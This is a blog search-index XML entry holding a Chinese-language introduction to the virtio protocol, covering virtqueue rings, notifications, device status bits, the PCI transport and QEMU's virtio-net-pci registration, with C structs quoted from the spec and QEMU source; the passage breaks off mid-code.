<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>virtio简介</title>
      <link href="/2024/08/23/virtio%E7%AE%80%E4%BB%8B/"/>
      <url>/2024/08/23/virtio%E7%AE%80%E4%BB%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在传统的设备模拟中，Qemu仿真完整的物理设备，每次<strong>guest</strong>的I/O操作都需要<strong>vm_exit</strong>和<strong>vcpu irq</strong>，如下所示<br><img src="全虚拟化.png" alt="全虚拟化示意图"></p><p>为了提高虚拟机的I/O效率，virtio协议被制定出来。在该方案中，<strong>guest</strong>能够感知到自己处于虚拟化环境，并且会加载相应的virtio总线驱动和virtio设备驱动与virtio设备进行通信，避免了<strong>guest</strong>的每次I/O操作都需要<strong>vm_exit</strong>和<strong>vcpu irq</strong>(仍然需要<strong>vm_exit</strong>和<strong>vcpu irq</strong>，但是将传统模拟中极多的<strong>vm_exit</strong>转换为<strong>virtio shared memory</strong>通信)，如下所示<br><img src="virtio示意图.png" alt="virtio示意图"></p><h1 id="virtio协议"><a href="#virtio协议" class="headerlink" title="virtio协议"></a>virtio协议</h1><p>根据<a href="https://docs.oasis-open.org/virtio/virtio/v1.2/cs01/virtio-v1.2-cs01.html#x1-100002">virtio标准2.</a>中的内容，virtio设备往往包含如下组件</p><ul><li><a href="https://docs.oasis-open.org/virtio/virtio/v1.2/cs01/virtio-v1.2-cs01.html#x1-270006">One or more virtqueues</a></li><li><a href="https://docs.oasis-open.org/virtio/virtio/v1.2/cs01/virtio-v1.2-cs01.html#x1-220005">Device Configuration space</a></li><li><a href="https://docs.oasis-open.org/virtio/virtio/v1.2/cs01/virtio-v1.2-cs01.html#x1-180003">Notifications</a></li><li><a href="https://docs.oasis-open.org/virtio/virtio/v1.2/cs01/virtio-v1.2-cs01.html#x1-110001">Device status field</a></li><li><a href="https://docs.oasis-open.org/virtio/virtio/v1.2/cs01/virtio-v1.2-cs01.html#x1-140002">Feature bits</a></li></ul><h2 id="virtqueue"><a href="#virtqueue" class="headerlink" title="virtqueue"></a>virtqueue</h2><p><strong>virtio设备</strong>和<strong>guest</strong>批量数据传输的机制被称为<strong>virtqueue</strong>，驱动和<strong>virtio设备</strong>共享<strong>virtqueue</strong>内存，整体如下所示(这里仅仅介绍<a href="https://docs.oasis-open.org/virtio/virtio/v1.2/cs01/virtio-v1.2-cs01.html#x1-350007">split virtqueues</a>，不介绍<a href="https://docs.oasis-open.org/virtio/virtio/v1.2/cs01/virtio-v1.2-cs01.html#x1-720008">packed virtqueues</a>)<br><img src="virtqueue示意图.png" alt="virtqueue示意图"></p><p>当驱动希望将请求提供给设备时，它会从<strong>descritor table</strong>中选择一个空闲的buffer并添加到<strong>available vring</strong>，并选择性地触发一个事件，通过发送<strong>通知</strong>(在后续<a href="#notifications">notifications</a>小节中介绍)给<strong>virtio设备</strong>，告知buffer已经准备好</p><p>设备在处理请求后，会将<strong>available vring</strong>中已使用的buffer添加到<strong>used vring</strong>中，并选择性地触发一个事件，发送<strong>通知</strong>给<strong>guest</strong>，表示该<strong>buffer</strong>已被使用过</p><p>根据<a href="https://docs.oasis-open.org/virtio/virtio/v1.2/cs01/virtio-v1.2-cs01.html#x1-270006">virtio标准2.6.</a>，<strong>virtqueue</strong>由<strong>descriptor table</strong>、<strong>available ring</strong>和<strong>used ring</strong>构成</p><h3 id="descriptor-table"><a href="#descriptor-table" class="headerlink" title="descriptor table"></a>descriptor table</h3><p><strong>descriptor table</strong>指的是驱动为设备准备的buffer，其中每个元素形式如<a href="https://docs.oasis-open.org/virtio/virtio/v1.2/cs01/virtio-v1.2-cs01.html#x1-430005">virtio标准2.7.5.</a>中定义<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">virtq_desc</span> &#123;</span> </span><br><span class="line">        <span class="comment">/* Address (guest-physical). */</span> </span><br><span class="line">        le64 addr; </span><br><span class="line">        <span class="comment">/* Length. */</span> </span><br><span class="line">        le32 len; </span><br><span class="line"> </span><br><span class="line"><span class="comment">/* This marks a buffer as continuing via the next field. */</span> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VIRTQ_DESC_F_NEXT   1 </span></span><br><span class="line"><span class="comment">/* This marks a buffer as device write-only (otherwise device read-only). */</span> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VIRTQ_DESC_F_WRITE     2 </span></span><br><span class="line"><span class="comment">/* This means the buffer contains a list of buffer descriptors. */</span> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VIRTQ_DESC_F_INDIRECT   4 </span></span><br><span class="line">        <span class="comment">/* The flags as indicated above. */</span> </span><br><span class="line">        le16 flags; </span><br><span class="line">        <span class="comment">/* Next field if flags &amp; NEXT */</span> </span><br><span class="line">        le16 next; </span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure><br>其中，每个描述符描述一个buffer，<strong>addr</strong>是<strong>guest</strong>的物理地址。描述符可以通过<strong>next</strong>进行链式连接，其中每个描述符描述的buffer要么是设备只读guest只写的，要么是设备只写guest只读的(但无论那种其描述符都是设备只读的)，但一个描述符链可以同时包含两种buffer</p><p>buffer的具体内容取决于设备类型，最常见的做法是包含一个设备只读头部表明数据类型，并在其后添加一个设备只写尾部以便设备写入</p><h3 id="available-ring"><a href="#available-ring" class="headerlink" title="available ring"></a>available ring</h3><p>驱动使用<strong>available ring</strong>将可用buffer提供给设备，其形式如<a href="https://docs.oasis-open.org/virtio/virtio/v1.2/cs01/virtio-v1.2-cs01.html#x1-490006">virtio标准2.7.6.</a>所示<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">virtq_avail</span> &#123;</span> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VIRTQ_AVAIL_F_NO_INTERRUPT      1 </span></span><br><span class="line">        le16 flags; </span><br><span class="line">        le16 idx; </span><br><span class="line">        le16 ring[ <span class="comment">/* Queue Size */</span> ]; </span><br><span class="line">        le16 used_event; <span class="comment">/* Only if VIRTIO_F_EVENT_IDX */</span> </span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure></p><p>其中，<strong>ring</strong>每个元素指向<strong>descriptor table</strong>中的描述符链，其仅由驱动写入，由设备读取</p><p><strong>idx</strong>表示驱动将下一个<strong>ring</strong>元素的位置，仅由驱动维护。除此之外，设备会维护一个<strong>last_avail_idx</strong>，表示设备使用过的最后一个<strong>ring</strong>元素的位置，即<strong>(last_avail_idx, idx)</strong>时所有可用的<strong>ring</strong>元素</p><h3 id="used-ring"><a href="#used-ring" class="headerlink" title="used ring"></a>used ring</h3><p>类似的，设备使用<strong>used ring</strong>将已用buffer提供给设备，其形式如<a href="https://docs.oasis-open.org/virtio/virtio/v1.2/cs01/virtio-v1.2-cs01.html#x1-540008">virtio标准2.7.8.</a>所示<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">virtq_used</span> &#123;</span> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VIRTQ_USED_F_NO_NOTIFY  1 </span></span><br><span class="line">        le16 flags; </span><br><span class="line">        le16 idx; </span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">virtq_used_elem</span> <span class="title">ring</span>[ /* <span class="title">Queue</span> <span class="title">Size</span> */];</span> </span><br><span class="line">        le16 avail_event; <span class="comment">/* Only if VIRTIO_F_EVENT_IDX */</span> </span><br><span class="line">&#125;; </span><br><span class="line"> </span><br><span class="line"><span class="comment">/* le32 is used here for ids for padding reasons. */</span> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">virtq_used_elem</span> &#123;</span> </span><br><span class="line">        <span class="comment">/* Index of start of used descriptor chain. */</span> </span><br><span class="line">        le32 id; </span><br><span class="line">        <span class="comment">/* </span></span><br><span class="line"><span class="comment">         * The number of bytes written into the device writable portion of </span></span><br><span class="line"><span class="comment">         * the buffer described by the descriptor chain. </span></span><br><span class="line"><span class="comment">         */</span> </span><br><span class="line">        le32 len; </span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure></p><p>其中，<strong>ring</strong>每个元素包含指向<strong>descriptor table</strong>中描述符链的<strong>id</strong>和设备实际写入的字节数<strong>len</strong>，其仅由设备写入，由驱动读取</p><p><strong>idx</strong>表示设备将下一个<strong>ring</strong>元素的位置，仅由设备维护。除此之外，驱动会维护一个<strong>last_used_idx</strong>，表示驱动使用过的最后一个<strong>ring</strong>元素的位置，即<strong>(last_used_idx, idx)</strong>时所有可用的<strong>ring</strong>元素</p><h2 id="device-configuration-space"><a href="#device-configuration-space" class="headerlink" title="device configuration space"></a>device configuration space</h2><p><strong>设备配置空间</strong>通常用于那些很少更改或在初始化时设定的参数。不同于<strong>PCI设备</strong>的配置空间，其是设备相关的，即不同类型的设备有不同的<strong>设备配置空间</strong>，如<strong>virtio-net</strong>设备的<strong>设备配置空间</strong>如<a href="https://docs.oasis-open.org/virtio/virtio/v1.2/cs01/virtio-v1.2-cs01.html#x1-2230004">virtio标准5.1.4.</a>所示而<strong>virtio-blk</strong>设备的<strong>设备配置空间</strong>如<a href="https://docs.oasis-open.org/virtio/virtio/v1.2/cs01/virtio-v1.2-cs01.html#x1-2790004">virtio标准5.2.4.</a>所示。</p><h2 id="notifications"><a href="#notifications" class="headerlink" title="notifications"></a>notifications</h2><p>驱动和<strong>virtio设备</strong>通过<strong>notifications</strong>来向对方表明有信息需要传达，根据<a href="https://docs.oasis-open.org/virtio/virtio/v1.2/cs01/virtio-v1.2-cs01.html#x1-180003">virtio标准2.3.</a>可知，共有三种：</p><ul><li>设备变更通知</li><li>可用buffer通知</li><li>已用buffer通知</li></ul><p>这些通知在不同的设备接口下有不同的表现形式</p><h3 id="设备变更通知"><a href="#设备变更通知" class="headerlink" title="设备变更通知"></a>设备变更通知</h3><p>设备变更通知是由设备发送给<strong>guest</strong>，表示前面介绍的<a href="#device-configuration-space">设备配置空间</a>发生了更改。</p><p>一般是Qemu利用硬件机制注入设置改变MSIx中断</p><h3 id="已用buffer通知"><a href="#已用buffer通知" class="headerlink" title="已用buffer通知"></a>已用buffer通知</h3><p>类似的，已用buffer通知也是由设备发送给<strong>guest</strong>，表示前面介绍的<a href="#used-ring">used vring</a>上更新了新的已用buffer。</p><p>一般是Qemu注入对应的MSIx中断</p><h3 id="可用buffer通知"><a href="#可用buffer通知" class="headerlink" title="可用buffer通知"></a>可用buffer通知</h3><p>可用buffer通知则是由<strong>guest</strong>驱动发送给设备的，表示前面介绍的<a href="#available-ring">available vring</a>上更新了新的可用buffer。</p><p>一般是Qemu设置一段特定的<strong>MMIO</strong>空间，驱动访问后触发<strong>vm_exit</strong>退出到<strong>kvm</strong>后利用ioeventfd机制通知Qemu</p><h2 id="device-status-field"><a href="#device-status-field" class="headerlink" title="device status field"></a>device status field</h2><p>在virtio驱动初始化设备期间，virtio驱动将按照<a href="https://docs.oasis-open.org/virtio/virtio/v1.2/cs01/virtio-v1.2-cs01.html#x1-1070001">virtio标准3.1.</a>中的步骤进行操作，而<strong>device status field</strong>提供了对初始化过程中已完成步骤的简单低级指示。可以将其想象成连接到控制台上的交通信号灯，每个信号灯表示一个设备的状态。</p><p>其初始化过程如下所示</p><ol><li>重置设备</li><li>设置<strong>ACKNOWLEDGE</strong>状态位，表明<strong>guest</strong>已经检测到设备</li><li>设置<strong>DRIVER</strong>状态位，表明<strong>guest</strong>知道是用什么驱动与设备交互</li><li>读取设备<strong>feature bits</strong>，并将驱动理解的<strong>feature bits</strong>子集写入设备</li><li>设置<strong>FEATURES_OK</strong>状态位。此步骤后，驱动不得接受新的<strong>feature bits</strong></li><li>重新读取<strong>device status field</strong>，确保<strong>FEATURES_OK</strong>状态位仍然设置着：否则设备不支持驱动设置的<strong>feature bits</strong>子集，设备将无法使用</li><li>执行设备的相关设置，包括配置设备<strong>virtqueue</strong>等</li><li>设置<strong>DRIVER_OK</strong>状态位。表示设备已经被初始化</li></ol><p><strong>device status field</strong>初始化为0，并在重置过程中由设备重新初始化为0</p><h3 id="ACKNOWLEDGE"><a href="#ACKNOWLEDGE" class="headerlink" title="ACKNOWLEDGE"></a>ACKNOWLEDGE</h3><p><strong>ACKNOWLEDGE</strong>的值是1，该字段被设置表明<strong>guest</strong>已经检测到设备并将其识别为有效的<strong>virtio设备</strong></p><h3 id="DRIVER"><a href="#DRIVER" class="headerlink" title="DRIVER"></a>DRIVER</h3><p><strong>DRIVER</strong>的值是2，该字段被设置表明<strong>guest</strong>知道如何驱动该设备，即知道使用什么驱动与设备交互</p><h3 id="FAILED"><a href="#FAILED" class="headerlink" title="FAILED"></a>FAILED</h3><p><strong>FAILED</strong>的值是128，该字段被设置表明<strong>guest</strong>中有错误，已经放弃了该<strong>virtio设备</strong>。该错误可能是内部错误、驱动错误或者设备操作过程中发生的致命错误</p><h3 id="FEATURES-OK"><a href="#FEATURES-OK" class="headerlink" title="FEATURES_OK"></a>FEATURES_OK</h3><p><strong>FEATURES_OK</strong>的值是8，该字段被设置表明<strong>guest</strong>的驱动和设备的<strong>feature bits</strong>协商完成</p><h3 id="DRIVER-OK"><a href="#DRIVER-OK" class="headerlink" title="DRIVER_OK"></a>DRIVER_OK</h3><p><strong>DRIVER_OK</strong>的值是4，该字段被设置表明<strong>guest</strong>的驱动已经设置好设备，可以正常驱动设备</p><h3 id="DEVICE-NEEDS-RESET"><a href="#DEVICE-NEEDS-RESET" class="headerlink" title="DEVICE_NEEDS_RESET"></a>DEVICE_NEEDS_RESET</h3><p><strong>DRIVER_OK</strong>的值是64，该字段被设置表明<strong>virtio设备</strong>遇到了无法恢复的错误</p><h2 id="feature-bits"><a href="#feature-bits" class="headerlink" title="feature bits"></a>feature bits</h2><p>每个<strong>virtio设备</strong>都有自己支持的<strong>feature bits</strong>集合。</p><p>在设备初始化期间，驱动会读取这些<strong>feature bits</strong>集合，并告知设备驱动支持的子集。</p><p>这种机制支持前向和后向兼容性：即如果设备通过新增<strong>feature bit</strong>进行了增强，较旧的驱动程序不会将该新增的<strong>feature bit</strong>告知给设备；类似的，如果驱动新增了设备不支持的<strong>feature bit</strong>，则其无法从设备中读取到新增的<strong>feature bit</strong></p><h1 id="virtio-transport"><a href="#virtio-transport" class="headerlink" title="virtio transport"></a>virtio transport</h1><p>根据<a href="https://docs.oasis-open.org/virtio/virtio/v1.2/cs01/virtio-v1.2-cs01.html#x1-1140004">virtio标准4.</a>可知，<strong>virtio协议</strong>可以使用各种不同的总线，因此<strong>virtio协议</strong>被分为通用部分和总线相关部分。即<strong>virtio协议</strong>规定都需要有<a href="#virtio协议">前面小节</a>介绍的5个组件，但驱动和<strong>virtio</strong>设备如何设置这些组件就是总线相关的。其主要可分为<strong>Virtio Over PCI Bus</strong>、<strong>Virtio Over MMIO</strong>和<strong>Virtio Over Channel I/O</strong>，而<strong>virtio-net-pci设备</strong>自然属于是<strong>Virtio Over PCI BUS</strong>。</p><p>根据<a href="https://docs.oasis-open.org/virtio/virtio/v1.2/cs01/virtio-v1.2-cs01.html#x1-1210003">virtio标准4.1.3.</a>可知，<strong>Virtio Over PCI BUS</strong>通过<strong>PCI Capabilities</strong>来设置<strong>virtio协议</strong>。根据<a href="/2024/08/04/qemu%E7%9A%84PCI%E8%AE%BE%E5%A4%87/" title="qemu的PCI设备">qemu的PCI设备</a>可知，标准的<strong>PCI配置空间</strong>如下图所示<br><img src="PCI配置空间.png" alt="PCI配置空间"></p><p>其中<strong>virtio协议</strong>使用这些<strong>PCI Capabilities</strong>作为<strong>virtio</strong>结构的配置空间，如下所示<br><img src="virtio的PCI配置空间.png" alt="virtio的PCI配置空间"></p><h2 id="capability"><a href="#capability" class="headerlink" title="capability"></a>capability</h2><p>具体的，每个配置空间的位置由下述格式的<strong>PCI Capabilities</strong>指定<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">virtio_pci_cap</span> &#123;</span> </span><br><span class="line">        u8 cap_vndr;    <span class="comment">/* Generic PCI field: PCI_CAP_ID_VNDR */</span> </span><br><span class="line">        u8 cap_next;    <span class="comment">/* Generic PCI field: next ptr. */</span> </span><br><span class="line">        u8 cap_len;     <span class="comment">/* Generic PCI field: capability length */</span> </span><br><span class="line">        u8 cfg_type;    <span class="comment">/* Identifies the structure. */</span> </span><br><span class="line">        u8 bar;         <span class="comment">/* Where to find it. */</span> </span><br><span class="line">        u8 id;          <span class="comment">/* Multiple capabilities of the same type */</span> </span><br><span class="line">        u8 padding[<span class="number">2</span>];  <span class="comment">/* Pad to full dword. */</span> </span><br><span class="line">        le32 offset;    <span class="comment">/* Offset within bar. */</span> </span><br><span class="line">        le32 length;    <span class="comment">/* Length of the structure, in bytes. */</span> </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><ul><li><strong>cap_vndr</strong>字段值为0x9，用于标识vendor；<strong>cap_next</strong>字段指向下一个<strong>PCI Capability</strong>在<strong>PCI设置空间</strong>的偏移</li><li><strong>cap_len</strong>字段表示当前<strong>capability</strong>的长度，包括紧跟在<strong>struct virtio_pci_cap</strong>后的数据</li><li><strong>cfg_type</strong>字段表示<strong>capability</strong>配置空间的类型，包括<strong>VIRTIO_PCI_CAP_COMMON_CFG</strong>、<strong>VIRTIO_PCI_CAP_NOTIFY_CFG</strong>、<strong>VIRTIO_PCI_CAP_ISR_CFG</strong>、<strong>VIRTIO_PCI_CAP_DEVICE_CFG</strong>、<strong>VIRTIO_PCI_CAP_PCI_CFG</strong>、<strong>VIRTIO_PCI_CAP_SHARED_MEMORY_CFG</strong>和<strong>VIRTIO_PCI_CAP_VENDOR_CFG</strong></li><li><strong>bar</strong>字段指向<strong>PCI配置空间</strong>的<strong>BAR</strong>寄存器，将组件配置空间映射到<strong>BAR</strong>寄存器指向的内存空间或I/O空间</li><li><strong>id</strong>字段用于唯一标识<strong>capability</strong></li><li><strong>offset</strong>字段表示组件配置空间在<strong>BAR</strong>空间的起始偏移</li><li><strong>length</strong>字段表示组件配置空间在<strong>BAR</strong>空间的长度</li></ul><p>其中，此结构根据<strong>cfg_type</strong>字段还会再数据结构后跟随额外的数据，例如<strong>VIRTIO_PCI_CAP_NOTIFY_CFG</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">virtio_pci_notify_cap</span> &#123;</span> </span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">virtio_pci_cap</span> <span class="title">cap</span>;</span> </span><br><span class="line">        le32 notify_off_multiplier; <span class="comment">/* Multiplier for queue_notify_off. */</span> </span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure></p><h2 id="配置空间"><a href="#配置空间" class="headerlink" title="配置空间"></a>配置空间</h2><p>根据前面的描述，<strong>capability</strong>配置空间包含<strong>VIRTIO_PCI_CAP_COMMON_CFG</strong>、<strong>VIRTIO_PCI_CAP_NOTIFY_CFG</strong>、<strong>VIRTIO_PCI_CAP_ISR_CFG</strong>、<strong>VIRTIO_PCI_CAP_DEVICE_CFG</strong>、<strong>VIRTIO_PCI_CAP_PCI_CFG</strong>、<strong>VIRTIO_PCI_CAP_SHARED_MEMORY_CFG</strong>和<strong>VIRTIO_PCI_CAP_VENDOR_CFG</strong>等。</p><p>这里以最重要的<strong>VIRTIO_PCI_CAP_COMMON_CFG</strong>配置空间为例，根据<a href="https://docs.oasis-open.org/virtio/virtio/v1.2/cs01/virtio-v1.2-cs01.html#x1-1270003">virtio标准4.1.4.3.</a>，其配置空间结构如下所示<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">virtio_pci_common_cfg</span> &#123;</span> </span><br><span class="line">        <span class="comment">/* About the whole device. */</span> </span><br><span class="line">        le32 device_feature_select;     <span class="comment">/* read-write */</span> </span><br><span class="line">        le32 device_feature;            <span class="comment">/* read-only for driver */</span> </span><br><span class="line">        le32 driver_feature_select;     <span class="comment">/* read-write */</span> </span><br><span class="line">        le32 driver_feature;            <span class="comment">/* read-write */</span> </span><br><span class="line">        le16 config_msix_vector;        <span class="comment">/* read-write */</span> </span><br><span class="line">        le16 num_queues;                <span class="comment">/* read-only for driver */</span> </span><br><span class="line">        u8 device_status;               <span class="comment">/* read-write */</span> </span><br><span class="line">        u8 config_generation;           <span class="comment">/* read-only for driver */</span> </span><br><span class="line"> </span><br><span class="line">        <span class="comment">/* About a specific virtqueue. */</span> </span><br><span class="line">        le16 queue_select;              <span class="comment">/* read-write */</span> </span><br><span class="line">        le16 queue_size;                <span class="comment">/* read-write */</span> </span><br><span class="line">        le16 queue_msix_vector;         <span class="comment">/* read-write */</span> </span><br><span class="line">        le16 queue_enable;              <span class="comment">/* read-write */</span> </span><br><span class="line">        le16 queue_notify_off;          <span class="comment">/* read-only for driver */</span> </span><br><span class="line">        le64 queue_desc;                <span class="comment">/* read-write */</span> </span><br><span class="line">        le64 queue_driver;              <span class="comment">/* read-write */</span> </span><br><span class="line">        le64 queue_device;              <span class="comment">/* read-write */</span> </span><br><span class="line">        le16 queue_notify_data;         <span class="comment">/* read-only for driver */</span> </span><br><span class="line">        le16 queue_reset;               <span class="comment">/* read-write */</span> </span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure><br>可以看到，其包含了前面<a href="#virtqueue">virtqueue</a>、<a href="#device-status-field">device status field</a>和<a href="#feature-bits">feature bits</a>等相关信息。具体的，其每个字段含义如下所示</p><ul><li><strong>device_feature_select</strong>字段被驱动用来选择读取设备哪些<a href="#feature-bits"><strong>feature bits</strong></a>。例如值0表示读取低32位的<a href="#feature-bits"><strong>feature bits</strong></a>，值1表示读取高32位的<a href="#feature-bits"><strong>feature bits</strong></a></li><li><strong>device_feature</strong>字段则是驱动通过<strong>device_feature_select</strong>选择的设备的对应<a href="#feature-bits"><strong>feature bits</strong></a></li><li><strong>driver_feature_select</strong>字段类似<strong>device_feature_select</strong>字段，被驱动用来选择想写入设备的<a href="#feature-bits"><strong>feature bits</strong></a>范围。值0表示写入低32位的<a href="#feature-bits"><strong>feature bits</strong></a>，值1表示写入高32位的<a href="#feature-bits"><strong>feature bits</strong></a></li><li><strong>driver_feature</strong>字段则是驱动通过<strong>driver_feature_select</strong>选择的写入设备的对应<a href="#feature-bits"><strong>feature bits</strong></a></li><li><strong>config_msix_vector</strong>字段用来设置MSI-X的<strong>Configuration Vector</strong></li><li><strong>num_queues</strong>字段表示设备支持的<a href="#virtqueue"><strong>virtqueues</strong></a>最大数量</li><li><strong>device_status</strong>字段用来设置<a href="#device-status-field"><strong>device status</strong></a></li><li><strong>config_generation</strong>字段会被设备每次更改设置后变化</li><li><strong>queue_select</strong>字段用来表示后续<strong>queue_</strong>字段所设置的<a href="#virtqueue"><strong>virtqueue</strong></a>序号</li><li><strong>queue_size</strong>字段用来表示<strong>queue_select</strong>指定的<a href="#virtqueue"><strong>virtqueue</strong></a>的大小</li><li><strong>queue_msix_vector</strong>字段用来指定<strong>queue_select</strong>指定的<a href="#virtqueue"><strong>virtqueue</strong></a>的MSI-X向量</li><li><strong>queue_enable</strong>字段用来指定<strong>queue_select</strong>指定的<a href="#virtqueue"><strong>virtqueue</strong></a>是否被启用</li><li><strong>queue_notify_off</strong>字段用来计算<strong>queue_select</strong>指定的<a href="#virtqueue"><strong>virtqueue</strong></a>的<strong>notification</strong>在<strong>VIRTIO_PCI_CAP_NOTIFY_CFG</strong>配置空间的偏移</li><li><strong>queue_desc</strong>字段用来指定<strong>queue_select</strong>指定的<a href="#virtqueue"><strong>virtqueue</strong></a>的<strong>descriptor table</strong>的物理地址</li><li><strong>queue_driver</strong>字段用来指定<strong>queue_select</strong>指定的<a href="#virtqueue"><strong>virtqueue</strong></a>的<strong>available ring</strong>的物理地址</li><li><strong>queue_device</strong>字段用来指定<strong>queue_select</strong>指定的<a href="#virtqueue"><strong>virtqueue</strong></a>的<strong>used ring</strong>的物理地址</li><li><strong>queue_reset</strong>字段用来指定<strong>queue_select</strong>指定的<a href="#virtqueue"><strong>virtqueue</strong></a>是否需要被重置</li></ul><p>可以看到，基本包含了之前接介绍的<a href="#virtio协议">virtio协议组件</a>的设置内容</p><h1 id="virtio设备"><a href="#virtio设备" class="headerlink" title="virtio设备"></a>virtio设备</h1><p>这里我们以<strong>virtio-net-pci</strong>为例，分析一下Qemu中的<strong>virtio</strong>协议</p><p><strong>virtio-pci</strong>类型的设备并没有静态的<strong>TypeInfo</strong>变量，其是通过<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/hw/virtio/virtio-pci.c#L2569"><strong>virtio_pci_types_register()</strong></a>动态生成并注册对应的<strong>TypeInfo</strong>。<strong>virtio-net-pci</strong>就是让<strong>virtio_pci_types_register()</strong>基于<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/hw/virtio/virtio-net-pci.c#L93"><strong>virtio_net_pci_info</strong></a>生成对应的<strong>TypeInfo</strong>变量并注册，如下所示<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> VirtioPCIDeviceTypeInfo virtio_net_pci_info = &#123;</span><br><span class="line">    .base_name             = TYPE_VIRTIO_NET_PCI,</span><br><span class="line">    .generic_name          = <span class="string">&quot;virtio-net-pci&quot;</span>,</span><br><span class="line">    .transitional_name     = <span class="string">&quot;virtio-net-pci-transitional&quot;</span>,</span><br><span class="line">    .non_transitional_name = <span class="string">&quot;virtio-net-pci-non-transitional&quot;</span>,</span><br><span class="line">    .instance_size = <span class="keyword">sizeof</span>(VirtIONetPCI),</span><br><span class="line">    .instance_init = virtio_net_pci_instance_init,</span><br><span class="line">    .class_init    = virtio_net_pci_class_init,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">virtio_net_pci_register</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    virtio_pci_types_register(&amp;virtio_net_pci_info);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">virtio_pci_types_register</span><span class="params">(<span class="type">const</span> VirtioPCIDeviceTypeInfo *t)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *base_name = <span class="literal">NULL</span>;</span><br><span class="line">   